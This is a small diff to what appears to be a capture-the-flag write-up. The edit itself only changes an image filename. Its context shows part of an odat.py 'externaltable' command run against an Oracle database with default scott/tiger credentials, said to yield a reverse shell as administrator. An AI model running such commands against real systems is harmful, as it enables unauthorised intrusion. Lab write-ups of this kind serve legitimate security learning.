@@ -85,4 +85,4 @@ $ ./odat.py externaltable -s 10.129.95.188 -p 1521 -d XE -U scott -P tiger --sys
 
 We would gain a reverse shell as the administrator.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
